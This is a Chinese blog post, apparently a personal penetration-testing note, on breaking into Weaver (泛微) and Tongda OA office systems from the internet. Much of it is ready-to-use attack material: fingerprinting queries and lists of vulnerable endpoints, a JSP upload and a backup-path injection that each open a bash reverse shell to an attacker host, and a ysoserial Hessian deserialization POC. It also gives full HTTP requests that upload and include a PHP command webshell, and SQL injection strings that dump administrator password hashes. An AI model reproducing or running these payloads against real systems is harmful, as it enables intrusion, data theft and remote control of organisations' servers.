@@ -1,0 +1,610 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" type="application/atom+xml"><link rel="alternate" type="application/json" title="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture6.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>常规外网打点-PART3</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">常规外网打点-PART3</h1><div class="meta"><span class="item" title="创建时间：2026-08-17 18:10:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-08-17T18:10:00+08:00">2026-08-17</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>13k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>12 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture6.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~"/></span><div class="body md" itemprop="articleBody"><h1 id="常规外网打点-part3持续更新中"><a class="anchor" href="#常规外网打点-part3持续更新中">#</a> 常规外网打点-PART3（持续更新中......）</h1>
+<h1 id="oa"><a class="anchor" href="#oa">#</a> OA</h1>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_82616673/article/details/142483917">活久见，竟然有人不知道OA是什么，我来给你扫盲吧！-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/714301946">初入职场第1名词:OA - 知乎</a></p>
+<p><strong>OA（Office Automation）</strong>：企业办公自动化系统，是一种集成办公自动化软件和硬件设备的信息管理系统，旨在提高办公效率和管理效能</p>
+<p><strong>OA系统通常包括以下核心功能</strong>：</p>
+<ul>
+<li><strong>文档管理</strong>：集中存储电子文档，支持版本控制和权限设置，方便查阅和管理</li>
+<li><strong>流程审批</strong>：电子化处理请假、报销、采购等审批流程，实现实时跟踪和监控</li>
+<li><strong>会议管理</strong>：提供会议预约、通知、记录及自动提醒功能，提高会议效率</li>
+<li><strong>日程安排与任务分配</strong>：帮助员工合理安排工作计划和任务，提升协作效率</li>
+<li><strong>财务与合同管理</strong>：支持报销、发票、合同审批及管理</li>
+<li><strong>考勤与人事管理</strong>：记录员工考勤、请假及人力资源相关事务</li>
+<li><strong>企业信息共享</strong>：通过统一平台实现信息共享，减少重复劳动和信息孤岛</li>
+</ul>
+<p><strong>OA的作用</strong>：</p>
+<ul>
+<li><strong>提高办公效率</strong>：自动化处理文件、邮件、日程等事务，节省时间和精力。</li>
+<li><strong>优化工作流程</strong>：规范审批和业务流程，减少人工操作，提高工作质量。</li>
+<li><strong>促进信息共享与协作</strong>：统一平台和数据库，实现跨部门协作。</li>
+<li><strong>提升管理效能</strong>：对人员、资源、项目进行有效管理和监控。</li>
+<li><strong>降低企业成本</strong>：减少人力和资源浪费，提高运营效率。</li>
+</ul>
+<h2 id="泛微oa"><a class="anchor" href="#泛微oa">#</a> 泛微OA</h2>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40037555/article/details/154278880">【Web安全】泛微OA框架SRC高频漏洞分析总结_泛微oa漏洞-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/priv/p/19296982">泛微OA系统特征及漏洞探测利用 - shinianyunyan - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://geekdaxue.co/read/m0untainshley@vmv2ut/gklgx3">泛微 OA 主流系统识别 - 《漏洞复现》 - 极客文档</a></p>
+<p>泛微OA是国内主流的企业级协同办公系统，由泛微网络开发维护，涵盖三大核心产品线：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 大型企业版</span></span>
+<span class="line"><span>e-cology</span></span>
+<span class="line"><span># 中小企业版</span></span>
+<span class="line"><span>e-office</span></span>
+<span class="line"><span># 移动办公版</span></span>
+<span class="line"><span>e-wechat</span></span>
+<span class="line"><span># 移动办公云平台</span></span>
+<span class="line"><span>eteams</span></span>
+<span class="line"><span># 政务办公平台</span></span>
+<span class="line"><span>e-nation</span></span></code></pre>
+<p>其核心为“前端门户（用户交互层）”、“应用服务器（业务逻辑层，基于Java EE开发）”、“数据库（数据存储层，主流适配MySQL，Oracle）”，部分版本还集成Apache Commons Collections、Hessian等第三方组件</p>
+<h3 id="指纹识别"><a class="anchor" href="#指纹识别">#</a> 指纹识别</h3>
+<ul>
+<li>
+<p>fofa语法：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># e-cology</span></span>
+<span class="line"><span>app="泛微-协同办公OA"</span></span>
+<span class="line"><span># e-mobile</span></span>
+<span class="line"><span>app="泛微-EMoblie"</span></span>
+<span class="line"><span># e-bridge</span></span>
+<span class="line"><span>app="泛微-云桥e-Bridge"</span></span>
+<span class="line"><span># E-Weaver</span></span>
+<span class="line"><span>app="泛微-E-Weaver"</span></span>
+<span class="line"><span># e-office</span></span>
+<span class="line"><span>app="泛微-EOffice"</span></span></code></pre>
+</li>
+<li>
+<p>e-cology：url中存在<code>/wui/index.html</code>关键字，登录处的图片上有<code>e-cology</code>字样</p>
+</li>
+<li>
+<p>e-mobile：可以从web的icon和登录处的图片中识别，指纹为<code>M</code>字样</p>
+</li>
+<li>
+<p>e-bridge：可以看登录界面的背景图，有<code>e-Bridge</code>字样</p>
+</li>
+<li>
+<p>e-weaver：右击界面会有弹窗<code>高效源于协同</code>，页面存在两个特殊的js：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>appres/hrm/js/mfcommon_wev8.js</span></span>
+<span class="line"><span>js/jquery/plugins/client/jquery.client_wev8.js</span></span></code></pre>
+</li>
+<li>
+<p>e-office：url中的<code>/general/login/index.php</code>，登录处的图片上有<code>e-office</code>字样</p>
+</li>
+</ul>
+<h3 id="文件上传漏洞"><a class="anchor" href="#文件上传漏洞">#</a> 文件上传漏洞</h3>
+<p>影响范围为e-cology &lt;= 8.5.0；e-office &lt;= 10.1</p>
+<p>其漏洞核心在于泛微OA的文件上传模块（如<code>weaver.fileupload.FileUploadAction</code>、<code>e-office/portal/attachment.jsp</code>）对上传文件的校验存在缺陷：</p>
+<ul>
+<li>仅依赖前端JS校验文件后缀，后端未二次验证</li>
+<li>未严格校验文件MIME类型与实际内容，允许篡改文件标识绕过</li>
+<li>部分版本上传路径默认位于Tomcat webapps目录下，且未禁用脚本执行权限，导致上传的可执行脚本（<code>.jsp</code>、<code>.jspx</code>）可直接运行</li>
+</ul>
+<p>那么攻击者就可以利用burpsuite工具在发送请求包时修改文件后缀为<code>.jsp</code>写入反弹shell代码（如Java Runtime执行系统命令），上传后访问文件存储路径即可获取服务器权限</p>
+<p>常见的漏洞接口有：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># e-cology</span></span>
+<span class="line"><span>/page/exportImport/upuloadOperation.jsp</span></span>
+<span class="line"><span>/weaver/weaver.file.FileDownloadForOutDoc</span></span>
+<span class="line"><span>/weaver/weaver.common.Ctrl/upload</span></span>
+<span class="line"><span>/weaver/bsh.servlet.BshServlet</span></span>
+<span class="line"><span>/systeminfo/broswer/systemBroswer.jsp</span></span>
+<span class="line"><span>/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># e-office</span></span>
+<span class="line"><span>/general/index/UploadFile.php</span></span>
+<span class="line"><span>/inc/attachment/upload.php</span></span>
+<span class="line"><span>/App/yyoa/attachment/upload.php</span></span>
+<span class="line"><span>/webservice/upload/upload.php</span></span>
+<span class="line"><span>/Emobile/App/Ajax/ajax.php</span></span>
+<span class="line"><span>其常见文件保存路径为/attachment（如按年月划分的文件夹/attachment/202608）或/general目录下的某些子临时文件夹</span></span></code></pre>
+<p>payload：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>&#x3C;%@ page import="java.io.*"%></span></span>
+<span class="line"><span>&#x3C;% </span></span>
+<span class="line"><span>Runtime.getRuntime().exec("bash -i >&#x26; /dev/tcp/attacker_ip/4444 0>&#x26;1"); </span></span>
+<span class="line"><span>%></span></span></code></pre>
+<p>然后可以尝试访问<code>http://target/e-cology/attachment/shell.jsp</code>，攻击机监听4444端口获取shell</p>
+<h3 id="sql注入漏洞"><a class="anchor" href="#sql注入漏洞">#</a> SQL注入漏洞</h3>
+<p>影响范围为e-cololgy &lt;= 9.0.5；e-office &lt;= 9.8</p>
+<p>漏洞核心在于泛微OA部分业务接口（如流程查询、用户管理）未使用预编译语句导致直接拼接用户输入作为SQL语句执行，导致SQL注入，典型风险接口包括：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># e-cology</span></span>
+<span class="line"><span>e-cology/weaver/common/Ctrl?id=1（id参数未过滤）</span></span>
+<span class="line"><span># e-office</span></span>
+<span class="line"><span>e-office/hr/manage/query.jsp?dept=IT（dept参数直接拼接进SELECT语句）</span></span>
+<span class="line"><span># 启用BshServlet(/weaver/bsh.servlet.BshServlet)时，可通过BeanShell执行SQL语句</span></span></code></pre>
+<p>payload（通过SQL注入获取管理员账号密码哈希）：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://target:8080/e-cology/weaver/common/Ctrl?id=1 and 1=2 union select 1,username,password,4 from sys_user where role=1</span></span></code></pre>
+<p>之后可以通过提取响应中的<code>username=admin</code>和<code>password=e10adc3949ba59abbe56e057f20f883e</code>（md5加密的123456），通过彩虹表破解哈希获取管理员明文密码</p>
+<p>除此之外，对于<code>/mobile/plugin/checkServer.jsp</code>的SQL注入，通常会利用时间盲注或报错注入，通过闭合单引号并拼接<code>waitfor delay '0:0:5'</code>（SQL Server）来验证注入存在，由于泛微<code>e-cology</code>很多时候后端对接的是SQL Server，甚至权限配置不当时可以通过<code>xp_cmdshell</code>直接利用SQL注入执行系统命令</p>
+<p><code>LoginSSO.jsp</code>盲注：单点登录（SSO）接口处理登录凭证时对输入的参数过滤不严</p>
+<p>e-office的<code>/general/index/inc/menu.php</code>可通过URL传参：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>?id=1 union select 1,2,database(),4 ...</span></span></code></pre>
+<p>利用联合注入查询敏感信息</p>
+<h3 id="未授权访问漏洞全版本默认配置"><a class="anchor" href="#未授权访问漏洞全版本默认配置">#</a> 未授权访问漏洞（全版本默认配置）</h3>
+<p>泛微OA部分核心接口未配置身份认证，无需登录即可访问敏感数据或执行操作：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 数据接口</span></span>
+<span class="line"><span>/e-cology/services/WorkflowService?wsdl 未授权获取流程数据</span></span>
+<span class="line"><span>/e-office/api/user/list 未授权获取员工信息</span></span>
+<span class="line"><span># 功能接口</span></span>
+<span class="line"><span>/weaver/weaver.report.reportViewAction 未授权导出财务报表</span></span>
+<span class="line"><span>/e-cology/portal/notice.jsp 未授权查看内部公告</span></span></code></pre>
+<p>攻击者可以通过访问这些路由，比如<code>/e-office/api/user/list</code>直接获取员工姓名、手机号、邮箱等信息，进而调用<code>WorkflowService</code>接口下载所有审批流程表单，将数据整理后用于社工或黑产交易</p>
+<h3 id="命令注入漏洞"><a class="anchor" href="#命令注入漏洞">#</a> 命令注入漏洞</h3>
+<p>影响范围为e-cology &lt;= 8.2.0；e-office &lt;= 10.0</p>
+<p>泛微OA”系统备份“、“日志导出”等功能模块存在命令拼接缺陷：</p>
+<ul>
+<li>备份功能中，<code>backupPath</code>参数直接拼接进<code>cmd.exe /c xcopy</code>或<code>bash cp</code>命令</li>
+<li>日志导出功能中，<code>logName</code>参数未过滤特殊字符<code>;</code>、<code>|</code>等，导致可额外注入系统命令</li>
+</ul>
+<p>攻击者可以登录泛微OA管理员后台的话，进入”系统管理-数据备份“，在备份路径输入框中填写<code>C:\backup;bash -i &gt;&amp; /dev/tcp/[IP]/4444 0&gt;&amp;1</code>，然后开始备份，攻击机监听端口获取反弹shell</p>
+<p>除此之外还有<strong>组件配置不当导致的直接命令执行（BshServlet RCE）</strong>：楼东街口为<code>/weaver/bsh.servlet.BshServlet</code>，BeanShell是一个小型的嵌入式Java源代码解释器，泛微在早期某些版本中为了方便调试引入并对外暴露了BeanShell的Servelt接口，该接口没有做任何权限限制，攻击者可以通过向该接口POST提交纯粹的Java代码，通过调用Java的<code>Runtime.getRuntime().exec()</code>，可以执行任意系统命令：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>bsh.script=exec("whoami");</span></span></code></pre>
+<h3 id="hessian反序列化漏洞"><a class="anchor" href="#hessian反序列化漏洞">#</a> Hessian反序列化漏洞</h3>
+<p>影响范围为e-cology &lt;= 7.5.0</p>
+<p>该漏洞的核心在于泛微e-cology低版本使用Hessian协议进行远程调用（如调度中心和子模块通信），未对序列化数据进行过滤，结合Apache Commons Collection 3.1（含反序列化漏洞组件），攻击者可以构造恶意序列化数据触发任意代码执行</p>
+<p>在泛微e-cology的历史版本中，为了实现接口的快速调用，系统暴露了一批接收二进制序列化流的接口，当移动端或其他客户端需要对服务端进行复杂对象传输时，会向这些接口发送Hessian编码的二进制流数据，后端Servlet接收到POST请求之后，会直接实例化<code>HessianInput</code>或<code>Hessian2Input</code>，并调用其<code>readObject()</code>方法解析数据包，Hessian，是一个轻量级RPC协议进行数据交互</p>
+<p>常见的暴露接口：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/mobile/plugin/SyncUserInfo.jsp</span></span>
+<span class="line"><span>/weaver/weaver.common.Ctrl/upload或相关的Ctrl路由</span></span>
+<span class="line"><span>/mobile/plugin/browser/BasicBroswer.jsp</span></span>
+<span class="line"><span>HttpMessage相关的系统内部调用接口</span></span></code></pre>
+<p>通常攻击者会向这些接口发送<code>Content-Type</code>为<code>application/octet-stream</code>或<code>application/x-www-form-urlencoded</code>的恶意Hessian数据包</p>
+<p>可以通过反序列化注入内存马实现持久化控制：</p>
+<p>使用<code>ysoserial</code>工具生成Hessian反序列化POC（基于<code>CommonsCollections1</code>gadget）：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>java -jar ysoserial.jar CommonsCollections1 "bash -i >&#x26; /dev/tcp/attacker_ip/4444 0>&#x26;1" > poc.ser</span></span></code></pre>
+<p>通过curl发送POC到Hessian接口：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>curl -X POST "http://target:8080/e-cology/hessian/service" \</span></span>
+<span class="line"><span>-H "Content-Type: x-application/hessian" \</span></span>
+<span class="line"><span>--data-binary @poc.ser</span></span></code></pre>
+<p>攻击机获取shell之后植入冰蝎内存马</p>
+<p>Hessian反序列化POC生成（e-cology 7.5）：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>// 基于ysoserial CommonsCollections1 gadget</span></span>
+<span class="line"><span>import ysoserial.payloads.CommonsCollections1;</span></span>
+<span class="line"><span>import java.io.FileOutputStream;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>public class HessianPOC &#123;</span></span>
+<span class="line"><span>    public static void main(String[] args) throws Exception &#123;</span></span>
+<span class="line"><span>        CommonsCollections1 cc1 = new CommonsCollections1();</span></span>
+<span class="line"><span>        byte[] payload = cc1.getPayload("bash -i >&#x26; /dev/tcp/1.1.1.1/4444 0>&#x26;1");</span></span>
+<span class="line"><span>        FileOutputStream fos = new FileOutputStream("poc.ser");</span></span>
+<span class="line"><span>        fos.write(payload);</span></span>
+<span class="line"><span>        fos.close();</span></span>
+<span class="line"><span>    &#125;</span></span>
+<span class="line"><span>&#125;</span></span></code></pre>
+<h2 id="通达oa"><a class="anchor" href="#通达oa">#</a> 通达OA</h2>
+<h3 id="文件上传与包含漏洞"><a class="anchor" href="#文件上传与包含漏洞">#</a> 文件上传与包含漏洞</h3>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.php.cn/faq/554050.html">通达OA前台任意文件上传漏洞及文件包含漏洞导致getshell的示例分析-安全-PHP中文网</a></p>
+<p>影响范围为V11、2017、2016、2015、2013及2013增强版</p>
+<p>该漏洞无需登录，利用前台即可实现漏洞利用</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 2013</span></span>
+<span class="line"><span>文件上传漏洞路径：/ispirit/im/upload.php</span></span>
+<span class="line"><span>文件包含漏洞路径：/ispirit/interface/gatewy.php</span></span>
+<span class="line"><span># 2017</span></span>
+<span class="line"><span>文件上传漏洞路径：/ispirit/im/upload.php</span></span>
+<span class="line"><span>文件包含漏洞路径：/mac/gateway.php</span></span></code></pre>
+<p>攻击者可以通过抓取数据包、修改并重放数据包的方式上传后缀为jpg的木马文件攻击系统，payload：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /ispirit/im/upload.php HTTP/1.1Host: 172.16.0.45Cache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh2YB4pV8McGBAccept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5Cookie: PHPSESSID=123Connection: closeContent-Length: 660------WebKitFormBoundarypyfBh2YB4pV8McGBContent-Disposition: form-data; name="UPLOAD_MODE"2------WebKitFormBoundarypyfBh2YB4pV8McGBContent-Disposition: form-data; name="P"123------WebKitFormBoundarypyfBh2YB4pV8McGBContent-Disposition: form-data; name="DEST_UID"1------WebKitFormBoundarypyfBh2YB4pV8McGBContent-Disposition: form-data; name="ATTACHMENT"; filename="jpg"Content-Type: image/jpeg&#x3C;?php$command=$_POST['cmd'];$wsh = new COM('WScript.shell');$exec = $wsh->exec("cmd /c ".$command);$stdout = $exec->StdOut();$stroutput = $stdout->ReadAll();echo $stroutput;?>------WebKitFormBoundarypyfBh2YB4pV8McGB--</span></span></code></pre>
+<p>通过修改数据包包含之前上传的jpg木马文件即可实现通过修改<code>cmd</code>参数的值执行任意命令：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>POST /ispirit/interface/gateway.php HTTP/1.1Host: 172.16.0.45Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 71json=&#123;"url":"/general/../../attach/im/2012/820434636.jpg"&#125;&#x26;cmd=net user</span></span></code></pre>
+<p>也可通过修改数据包上传木马文件执行写入文件操作的木马后进行文件包含，然后冰蝎连接<code>/ispirit/interface/shell.php</code></p>
+<p>其他涉及文件上传/文件包含漏洞路径：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># &#x3C;=v11.3</span></span>
+<span class="line"><span>module/upload/upload.php</span></span>
+<span class="line"><span>mobile/reportshop/report/getdata.php</span></span>
+<span class="line"><span>ispirit/im/upload.php</span></span>
+<span class="line"><span>ispirit/interface/gateway.php(文件包含)</span></span>
+<span class="line"><span># &#x3C;=v11.5</span></span>
+<span class="line"><span>swfupload.php</span></span>
+<span class="line"><span># &#x3C;=v11.6</span></span>
+<span class="line"><span>data_center/utils/upload.php</span></span>
+<span class="line"><span># &#x3C;=v11.7</span></span>
+<span class="line"><span>new/submit.php</span></span>
+<span class="line"><span># &#x3C;=v11.8</span></span>
+<span class="line"><span>api.ali.php</span></span>
+<span class="line"><span>staff_info/update.php(文件包含/远程命令执行)</span></span>
+<span class="line"><span># &#x3C;=v11.9</span></span>
+<span class="line"><span>netdisk/upload.php</span></span>
+<span class="line"><span># 2015</span></span>
+<span class="line"><span>reporttshop/utils/upload.php</span></span></code></pre>
+<h3 id="sql注入漏洞-2"><a class="anchor" href="#sql注入漏洞-2">#</a> SQL注入漏洞</h3>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/13608532.html">通达OA 11.5 sql注入漏洞复现 - 雨中落叶 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/118313817">通达OA 11.5 SQL注入漏洞复现_如何判断通达oa版本-CSDN博客</a></p>
+<p>影响范围为 11.5</p>
+<h4 id="id参数存在sqli注入"><a class="anchor" href="#id参数存在sqli注入">#</a> id参数存在sqli注入</h4>
+<p>某些低版本也无需登录可以实现注入，普通账号登录权限即可</p>
+<p>参数位置：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>/general/appbuilder/web/report/repdetail/edit?link_type=false&#x26;slot=&#123;&#125;&#x26;id=2</span></span></code></pre>
+<p>可以通过修改数据包或者sqlmap进行注入攻击：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 布尔盲注</span></span>
+<span class="line"><span>id=(SELECT (CASE WHEN (2489=2489) THEN 2 ELSE (SELECT 2530 UNION SELECT 6370) END))</span></span>
+<span class="line"><span># 时间盲注</span></span>
+<span class="line"><span>link_type=false&#x26;slot=&#123;&#125;&#x26;id=2 OR (SELECT 4201 FROM (SELECT(SLEEP(5)))birR)</span></span></code></pre>
